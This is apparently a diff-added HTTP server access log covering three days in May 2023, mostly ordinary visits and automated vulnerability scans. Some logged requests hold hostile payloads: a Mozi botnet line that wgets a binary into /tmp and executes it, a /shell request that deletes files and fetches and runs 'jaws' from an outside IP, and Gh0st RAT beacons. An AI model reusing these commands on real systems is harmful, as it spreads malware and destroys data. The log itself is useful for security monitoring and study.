+43.135.123.64 - - [13/May/2023 21:13:44] code 400, message Bad request syntax ('\x02')
+43.135.123.64 - - [13/May/2023 21:13:44] "\x02" HTTPStatus.BAD_REQUEST -
+43.135.123.64 - - [13/May/2023 21:13:44] code 400, message Bad request syntax ('\x00\x00\x00')
+43.135.123.64 - - [13/May/2023 21:13:44] "\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+171.4.240.172 - - [13/May/2023 23:08:02] "GET / HTTP/1.1" 200 -
+188.124.56.207 - - [13/May/2023 23:10:00] "GET / HTTP/1.1" 200 -
+188.124.56.207 - - [13/May/2023 23:10:00] "GET /api.json HTTP/1.1" 404 -
+107.170.241.8 - - [13/May/2023 23:51:13] "GET /druid/index.html HTTP/1.1" 404 -
+192.236.147.172 - - [14/May/2023 00:06:23] "GET / HTTP/1.1" 200 -
+167.248.133.51 - - [14/May/2023 00:52:46] "GET / HTTP/1.1" 200 -
+167.248.133.51 - - [14/May/2023 00:52:46] "GET / HTTP/1.1" 200 -
+167.248.133.51 - - [14/May/2023 00:52:47] code 505, message Invalid HTTP version (2.0)
+167.248.133.51 - - [14/May/2023 00:52:47] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.248.133.51 - - [14/May/2023 00:52:47] "GET /favicon.ico HTTP/1.1" 404 -
+103.38.237.172 - - [14/May/2023 01:02:05] "GET / HTTP/1.1" 200 -
+167.172.89.248 - - [14/May/2023 01:19:38] "GET /aaa9 HTTP/1.1" 404 -
+167.172.89.248 - - [14/May/2023 01:19:50] "GET /aab8 HTTP/1.1" 404 -
+167.172.89.248 - - [14/May/2023 01:20:01] "GET / HTTP/1.1" 200 -
+95.164.44.19 - - [14/May/2023 02:09:57] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+165.227.147.215 - - [14/May/2023 02:40:56] "GET /aaa9 HTTP/1.1" 404 -
+165.227.147.215 - - [14/May/2023 02:41:13] "GET /aab8 HTTP/1.1" 404 -
+165.227.147.215 - - [14/May/2023 02:41:45] "GET / HTTP/1.1" 200 -
+168.232.12.206 - - [14/May/2023 02:44:47] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [14/May/2023 03:01:48] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+34.76.158.233 - - [14/May/2023 03:38:32] "GET / HTTP/1.1" 200 -
+90.151.171.108 - - [14/May/2023 03:58:18] "CONNECT ip.bablosoft.com:443 HTTP/1.1" 404 -
+90.151.171.108 - - [14/May/2023 03:58:28] code 400, message Bad request syntax ('\x04\x01\x00P\x8e]\x88\x8e0\x00')
+90.151.171.108 - - [14/May/2023 03:58:28] "\x04\x01\x00P\x8e]\x88\x8e0\x00" HTTPStatus.BAD_REQUEST -
+90.151.171.108 - - [14/May/2023 03:58:28] "GET http://ip.bablosoft.com/?Z76365854670Q1 HTTP/1.1" 200 -
+90.151.171.108 - - [14/May/2023 03:58:38] code 400, message Bad request syntax ('\x05\x01\x00')
+90.151.171.108 - - [14/May/2023 03:58:38] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:05:00] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [14/May/2023 04:05:00] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:05:06] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [14/May/2023 04:05:06] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:05:11] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [14/May/2023 04:05:11] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:07:08] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [14/May/2023 04:07:08] "\x04\x01\x00P\x05¼Òã\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:07:13] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [14/May/2023 04:07:13] "\x04\x01\x00P\x05¼Òã\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:07:18] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [14/May/2023 04:07:18] "\x04\x01\x00P\x05¼Òã\x00" HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [14/May/2023 04:07:55] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 -
+152.89.196.144 - - [14/May/2023 04:24:11] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+87.236.176.26 - - [14/May/2023 05:38:36] "GET / HTTP/1.1" 200 -
+162.142.125.215 - - [14/May/2023 05:57:57] "GET / HTTP/1.1" 200 -
+162.142.125.215 - - [14/May/2023 05:57:58] "GET / HTTP/1.1" 200 -
+162.142.125.215 - - [14/May/2023 05:57:58] code 505, message Invalid HTTP version (2.0)
+162.142.125.215 - - [14/May/2023 05:57:58] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.215 - - [14/May/2023 05:57:58] "GET /favicon.ico HTTP/1.1" 404 -
+212.200.113.190 - - [14/May/2023 06:24:32] "GET / HTTP/1.1" 200 -
+117.215.239.33 - - [14/May/2023 06:25:03] "GET / HTTP/1.1" 200 -
+66.240.205.34 - - [14/May/2023 07:35:53] code 400, message Bad request version ('ô')
+66.240.205.34 - - [14/May/2023 07:35:53] "H\x00\x00\x00tj¨\x9e#D\x98+Êð§»lÅ\x19×\x8d¶\x18íJ\x1enÁùxu[lðE\x1d-jìÔxLÉrÉ\x15\x10uà%\x86Rtg\x05fv\x86]%Ì\x80\x0cèÏ®\x00µÀfÈ\x8dDÅ\x09ô" HTTPStatus.BAD_REQUEST -
+62.84.32.240 - - [14/May/2023 07:44:42] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [14/May/2023 07:44:42] "GET /static/style.css HTTP/1.1" 304 -
+198.235.24.113 - - [14/May/2023 08:13:46] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.113 - - [14/May/2023 08:13:46] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x19ó8Ö,É\x1bÚuù\x1a(¹CX3\x1ed]\x01C\x8d¾=ã8ëN \x01d¤\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+45.128.232.121 - - [14/May/2023 09:00:26] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+179.43.177.243 - - [14/May/2023 09:05:45] "GET / HTTP/1.1" 200 -
+103.116.52.145 - - [14/May/2023 09:08:41] "GET / HTTP/1.1" 200 -
+162.246.16.194 - - [14/May/2023 09:54:57] code 400, message Bad request version ("þhIÔ³><äÅ8ýJ\x97¸o\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+162.246.16.194 - - [14/May/2023 09:54:57] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03"rJ¤|ØÒÌá\x9c¾=U½\x9a«¬&ÁÐ\x18ªãhÁWJ\\%®GÜ 1@\x05Ã»0Ãzªba¹kZ1\x07 þhIÔ³><äÅ8ýJ\x97¸o\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+162.246.16.194 - - [14/May/2023 09:54:57] "GET / HTTP/1.1" 200 -
+20.150.210.183 - - [14/May/2023 10:39:24] "GET /.env HTTP/1.1" 404 -
+20.150.210.183 - - [14/May/2023 10:39:24] "POST / HTTP/1.1" 405 -
+103.12.135.123 - - [14/May/2023 11:03:25] "GET /_profiler/phpinfo HTTP/1.1" 404 -
+95.164.44.19 - - [14/May/2023 11:23:51] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+122.96.31.138 - - [14/May/2023 11:42:24] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+122.96.31.138 - - [14/May/2023 11:42:24] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -
+188.166.87.67 - - [14/May/2023 12:59:19] "GET / HTTP/1.1" 200 -
+188.166.87.67 - - [14/May/2023 12:59:29] code 400, message Bad request version ("x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|")
+188.166.87.67 - - [14/May/2023 12:59:29] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" HTTPStatus.BAD_REQUEST -
+95.164.44.19 - - [14/May/2023 13:23:40] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+41.76.215.166 - - [14/May/2023 13:44:12] "GET /admin/config.php HTTP/1.0" 404 -
+141.98.6.151 - - [14/May/2023 13:49:11] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+172.104.11.51 - - [14/May/2023 13:50:40] code 400, message Bad request version ('À\x14À')
+172.104.11.51 - - [14/May/2023 13:50:40] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03ít\x93Óý\x12NUÑ4\x9aË\x9dY_è~2Ä\x9e\x04þ©\x8dþ-ÇW3ÉÈ\x96\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+87.121.221.49 - - [14/May/2023 14:18:13] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+188.124.56.207 - - [14/May/2023 14:45:00] "GET / HTTP/1.1" 200 -
+188.124.56.207 - - [14/May/2023 14:45:00] "GET /api.json HTTP/1.1" 404 -
+45.92.1.195 - - [14/May/2023 15:08:39] "GET /.env HTTP/1.1" 404 -
+45.92.1.195 - - [14/May/2023 15:08:39] "POST / HTTP/1.1" 405 -
+167.94.138.127 - - [14/May/2023 16:21:45] "GET / HTTP/1.1" 200 -
+167.94.138.127 - - [14/May/2023 16:21:46] "GET / HTTP/1.1" 200 -
+167.94.138.127 - - [14/May/2023 16:21:46] code 505, message Invalid HTTP version (2.0)
+167.94.138.127 - - [14/May/2023 16:21:46] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.127 - - [14/May/2023 16:21:46] "GET /favicon.ico HTTP/1.1" 404 -
+213.108.196.20 - - [14/May/2023 16:23:11] code 400, message Bad request version ('net.tcp://176.113.115.16:4122/\x03\x08')
+213.108.196.20 - - [14/May/2023 16:23:11] "\x00\x0c)\x82Ë3ìô»\x86-í\x08\x00E\x00\x00PEê@\x00\x80\x06Î\x90À¨\x02\x03°qs\x10Â#\x10\x1a«ìVº\x99ª\x10ÏP\x18\x01\x00Ð\x0e\x00\x00\x00\x01\x00\x01\x02\x02\x1enet.tcp://176.113.115.16:4122/\x03\x08\x0c" HTTPStatus.BAD_REQUEST -
+213.108.196.20 - - [14/May/2023 16:57:59] code 400, message Bad request version ('À\x13À')
+213.108.196.20 - - [14/May/2023 16:57:59] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03æÁ\x99\x995JmÆ\x17ÊYî\x02\x08¦yNH;8?ÏÎ À*aHYÞÀ/ ]\x8a\x9dq¸µ÷Þæ\x83$_b\x0dL\x11yò\x17÷û¼7[\x87¶Ê)N/*²\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+213.108.196.20 - - [14/May/2023 16:57:59] "GET / HTTP/1.1" 200 -
+213.108.196.20 - - [14/May/2023 16:58:00] "GET /favicon.ico HTTP/1.1" 404 -
+213.108.196.20 - - [14/May/2023 17:07:06] "GET / HTTP/1.1" 200 -
+213.108.196.20 - - [14/May/2023 17:07:06] "GET /favicon.ico HTTP/1.1" 404 -
+66.175.213.4 - - [14/May/2023 17:11:56] "GET / HTTP/1.1" 200 -
+213.108.196.20 - - [14/May/2023 17:13:27] "GET / HTTP/1.1" 200 -
+213.108.196.20 - - [14/May/2023 17:26:03] "GET /aaa9 HTTP/1.1" 404 -
+213.108.196.20 - - [14/May/2023 17:26:06] "GET /aaa9 HTTP/1.1" 404 -
+213.108.196.20 - - [14/May/2023 17:26:08] "GET /aab9 HTTP/1.1" 404 -
+213.108.196.20 - - [14/May/2023 17:26:10] "GET /aab9 HTTP/1.1" 404 -
+213.108.196.20 - - [14/May/2023 17:26:10] code 400, message Bad request version ('HTTP1.1')
+213.108.196.20 - - [14/May/2023 17:26:10] "GET /%0 HTTP1.1" HTTPStatus.BAD_REQUEST -
+45.88.66.48 - - [14/May/2023 17:45:00] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 -
+176.222.167.72 - - [14/May/2023 17:58:13] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 17:58:14] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 17:58:17] "GET /favicon.ico HTTP/1.1" 404 -
+95.164.44.19 - - [14/May/2023 18:00:14] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+193.35.18.65 - - [14/May/2023 18:04:57] "GET / HTTP/1.1" 200 -
+193.35.18.65 - - [14/May/2023 18:04:58] "POST /HNAP1/ HTTP/1.1" 404 -
+31.171.187.124 - - [14/May/2023 18:11:20] "GET / HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:11:20] "GET /static/style.css HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:11:21] "GET /favicon.ico HTTP/1.1" 404 -
+31.171.187.124 - - [14/May/2023 18:12:01] "POST /generate_text HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:02] "POST /generate_text HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:02] "POST /generate_text HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:02] "GET /static/style.css HTTP/1.1" 304 -
+31.171.187.124 - - [14/May/2023 18:12:02] "POST /generate_text HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:04] "POST /generate_text HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:05] "POST /generate_text HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:06] "GET / HTTP/1.1" 200 -
+31.171.187.124 - - [14/May/2023 18:12:07] "GET /static/style.css HTTP/1.1" 304 -
+31.171.187.124 - - [14/May/2023 18:12:07] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 18:12:12] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 18:12:12] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:06:55] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:06:56] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:06:56] "GET /favicon.ico HTTP/1.1" 404 -
+176.222.167.72 - - [14/May/2023 19:07:23] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:07:23] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:07:45] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:07:45] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:08:07] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:08:07] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:08:34] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:08:34] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:08:44] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:08:44] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.72 - - [14/May/2023 19:17:40] "GET / HTTP/1.1" 200 -
+176.222.167.72 - - [14/May/2023 19:17:40] "GET /static/style.css HTTP/1.1" 304 -
+45.128.232.121 - - [14/May/2023 19:56:10] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+66.240.205.34 - - [14/May/2023 20:07:12] code 400, message Bad request version ('®¯]')
+66.240.205.34 - - [14/May/2023 20:07:12] "Gh0st­\x00\x00\x00à\x00\x00\x00x\x9cKS``\x98ÃÀÀÀ\x06Ä\x8c@¼Q\x96\x81\x81\x09H\x07§\x16\x95e&§*\x04$&g+\x182\x94ö°00¬¨rc\x00\x01\x11 \x82\x1f\\`&\x83ÇK7\x86\x19ån\x0c9\x95n\x0c;\x84\x0f3¬èsch¨^Ï4'J\x97©\x82ã0Ã\x91h]&\x90øÎ\x97SËA4L?2=áÄ\x92\x86\x0b@õ`\x0cT\x1f®¯]" HTTPStatus.BAD_REQUEST -
+185.233.19.120 - - [14/May/2023 20:22:37] "GET / HTTP/1.1" 200 -
+125.84.239.213 - - [14/May/2023 20:44:39] "GET / HTTP/1.0" 200 -
+117.14.150.159 - - [14/May/2023 20:45:35] "GET / HTTP/1.1" 200 -
+111.162.136.128 - - [14/May/2023 20:45:50] "GET / HTTP/1.1" 200 -
+1.202.112.121 - - [14/May/2023 20:46:05] "GET /favicon.ico HTTP/1.1" 404 -
+185.73.246.68 - - [14/May/2023 20:53:39] "GET / HTTP/1.1" 200 -
+34.245.116.52 - - [14/May/2023 21:57:40] "GET / HTTP/1.0" 200 -
+64.62.197.218 - - [14/May/2023 22:06:45] "GET / HTTP/1.1" 200 -
+64.62.197.219 - - [14/May/2023 22:08:02] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.212 - - [14/May/2023 22:08:53] "GET /geoserver/web/ HTTP/1.1" 404 -
+45.128.232.62 - - [14/May/2023 22:10:32] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+104.152.52.131 - - [14/May/2023 22:14:45] "GET / HTTP/1.0" 200 -
+94.102.61.10 - - [14/May/2023 22:30:57] "GET / HTTP/1.1" 200 -
+109.237.97.180 - - [14/May/2023 22:44:37] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [14/May/2023 22:44:37] code 400, message Bad request version ('Ørª\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.97.180 - - [14/May/2023 22:44:37] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03;ÅæµÐz\x89dFÃ\x185øÿÊ\x93\x96éb\x9bÛÍfí¦\x7fÃ\x8cÊ©l\x1c ó\x88PZ+ie\x8d¯+ãM&ÂÉ]|\x92\x15¼G\x01\x07\x84ìzÊÇ Ørª\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+193.35.18.60 - - [14/May/2023 22:51:45] "GET / HTTP/1.1" 200 -
+193.35.18.60 - - [14/May/2023 22:51:53] "POST /HNAP1/ HTTP/1.1" 404 -
+20.51.187.91 - - [14/May/2023 23:36:59] "GET /.env HTTP/1.1" 404 -
+20.51.187.91 - - [14/May/2023 23:36:59] "POST / HTTP/1.1" 405 -
+179.43.177.243 - - [15/May/2023 00:22:10] "GET / HTTP/1.1" 200 -
+179.43.163.132 - - [15/May/2023 01:01:43] "GET / HTTP/1.1" 200 -
+179.43.163.132 - - [15/May/2023 01:01:43] "POST /HNAP1/ HTTP/1.1" 404 -
+134.122.184.35 - - [15/May/2023 02:00:11] "GET /xkyyy/145705-1-1.html HTTP/1.1" 404 -
+64.62.197.96 - - [15/May/2023 02:11:23] "GET / HTTP/1.1" 200 -
+64.62.197.96 - - [15/May/2023 02:12:44] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.104 - - [15/May/2023 02:13:31] "GET /geoserver/web/ HTTP/1.1" 404 -
+34.222.190.21 - - [15/May/2023 02:14:40] "GET / HTTP/1.1" 200 -
+103.116.52.145 - - [15/May/2023 02:22:31] "GET / HTTP/1.1" 200 -
+117.215.234.54 - - [15/May/2023 02:27:19] "GET / HTTP/1.1" 200 -
+117.215.234.54 - - [15/May/2023 02:27:19] "GET / HTTP/1.1" 200 -
+34.76.96.55 - - [15/May/2023 03:19:01] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [15/May/2023 03:21:40] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+179.43.177.243 - - [15/May/2023 03:58:41] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+20.219.188.145 - - [15/May/2023 04:30:54] "GET /.env HTTP/1.1" 404 -
+20.219.188.145 - - [15/May/2023 04:30:54] "GET /wp-content/ HTTP/1.1" 404 -
+14.231.121.151 - - [15/May/2023 04:34:11] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 5.255.111.128/jaws;sh+/tmp/jaws HTTP/1.1')
+14.231.121.151 - - [15/May/2023 04:34:11] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 5.255.111.128/jaws;sh+/tmp/jaws HTTP/1.1" HTTPStatus.BAD_REQUEST -
+162.142.125.216 - - [15/May/2023 05:41:41] "GET / HTTP/1.1" 200 -
+162.142.125.216 - - [15/May/2023 05:41:41] "GET / HTTP/1.1" 200 -
+162.142.125.216 - - [15/May/2023 05:41:41] code 505, message Invalid HTTP version (2.0)
+162.142.125.216 - - [15/May/2023 05:41:41] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.216 - - [15/May/2023 05:41:42] "GET /favicon.ico HTTP/1.1" 404 -
+45.128.232.121 - - [15/May/2023 05:54:01] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+45.95.169.240 - - [15/May/2023 06:00:31] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+152.89.196.144 - - [15/May/2023 06:35:56] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+103.14.26.208 - - [15/May/2023 06:45:34] "GET /restore.php HTTP/1.1" 404 -
+198.235.24.238 - - [15/May/2023 06:59:15] "GET / HTTP/1.0" 200 -
+89.218.247.130 - - [15/May/2023 07:15:12] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [15/May/2023 07:15:13] "GET /static/style.css HTTP/1.1" 200 -
+89.218.247.130 - - [15/May/2023 07:15:14] "GET /favicon.ico HTTP/1.1" 404 -
+89.218.247.130 - - [15/May/2023 07:16:56] "POST /generate_text HTTP/1.1" 200 -
+89.218.247.130 - - [15/May/2023 07:16:56] "GET /static/style.css HTTP/1.1" 304 -
+89.218.247.130 - - [15/May/2023 07:17:07] "GET / HTTP/1.1" 200 -
+89.218.247.130 - - [15/May/2023 07:17:07] "GET /static/style.css HTTP/1.1" 304 -
+89.218.247.130 - - [15/May/2023 07:17:16] "GET /files.html HTTP/1.1" 200 -
+89.218.247.130 - - [15/May/2023 07:17:16] "GET /static/files.css HTTP/1.1" 200 -
+162.221.192.26 - - [15/May/2023 07:59:11] "GET / HTTP/1.1" 200 -
+34.141.197.253 - - [15/May/2023 08:20:09] code 400, message Bad request version ('þX6O!è¯÷°¬2Ëê\x7f')
+34.141.197.253 - - [15/May/2023 08:20:09] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03\x91J6\x83ë.6«'È©¿.¿\x9f\x07\x8fåR&è\x17:s \x1ab\x15ù\x85Gô þX6O!è¯÷°¬2Ëê\x7f" HTTPStatus.BAD_REQUEST -
+34.141.197.253 - - [15/May/2023 08:20:11] "OPTIONS / HTTP/1.0" 200 -
+68.183.38.167 - - [15/May/2023 08:26:05] code 400, message Bad request syntax ('\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03)kr»T\x7fRI-ÏÆ;8\x97¨~"ø\x1aøFÇÅ¼NÜl*®»¼·\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+68.183.38.167 - - [15/May/2023 08:26:05] "\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03)kr»T\x7fRI-ÏÆ;8\x97¨~"ø\x1aøFÇÅ¼NÜl*®»¼·\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+95.167.54.150 - - [15/May/2023 08:26:24] "GET / HTTP/1.1" 200 -
+198.235.24.232 - - [15/May/2023 09:54:45] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.232 - - [15/May/2023 09:54:45] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Ðg:§*1P·å1^ê8JÛªbéË {Çt\x980ïd\x95\x11Ñ±¼\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+87.121.221.170 - - [15/May/2023 10:02:51] "GET /.env HTTP/1.1" 404 -
+87.121.221.170 - - [15/May/2023 10:02:51] "POST / HTTP/1.1" 405 -
+59.88.226.228 - - [15/May/2023 10:19:11] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 -
+176.222.167.72 - - [15/May/2023 11:46:55] "GET /generate_text HTTP/1.1" 405 -
+176.222.167.72 - - [15/May/2023 11:46:55] "GET /favicon.ico HTTP/1.1" 404 -
+45.33.80.243 - - [15/May/2023 13:53:22] code 400, message Bad request version ('À\x14À')
+45.33.80.243 - - [15/May/2023 13:53:22] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x10O"ZaeòÁí1\x0c`\x99i´\x9f\x00\x17 ¹²Æ\x82qD¯½Ì¡32\x98\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+45.92.1.195 - - [15/May/2023 13:58:47] "GET /.env HTTP/1.1" 404 -
+45.92.1.195 - - [15/May/2023 13:58:48] "POST / HTTP/1.1" 405 -
+109.237.98.226 - - [15/May/2023 14:20:55] "GET /.env HTTP/1.1" 404 -
+109.237.98.226 - - [15/May/2023 14:20:55] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01H\x01\x00\x01D\x03\x03Üj\x8b§w{kfv&¡¸`OL\x91\x84%\x06É£Þuî\x9dO(#2+\x8cÀ')
+109.237.98.226 - - [15/May/2023 14:20:55] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03Üj\x8b§w{kfv&¡¸`OL\x91\x84%\x06É£Þuî\x9dO(#2+\x8cÀ \x04¤V\x95Ø©,\x89@,[\x90\x19¢\x83\x00'Ö\x02AJ#È¡ûW\x10¡²#yH\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+128.71.239.165 - - [15/May/2023 14:46:53] "GET / HTTP/1.1" 200 -
+128.71.239.165 - - [15/May/2023 14:46:53] "GET /HNAP1/ HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 14:52:34] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:52:34] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:52:36] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [15/May/2023 14:55:04] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:55:04] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:55:44] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:55:44] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:57:23] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:57:23] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:58:02] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:58:02] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:58:53] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:58:53] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:59:04] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:59:04] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:59:16] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:59:16] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 14:59:31] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 14:59:32] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [15/May/2023 15:02:52] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:02:52] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [15/May/2023 15:02:55] "GET / HTTP/1.1" 200 -
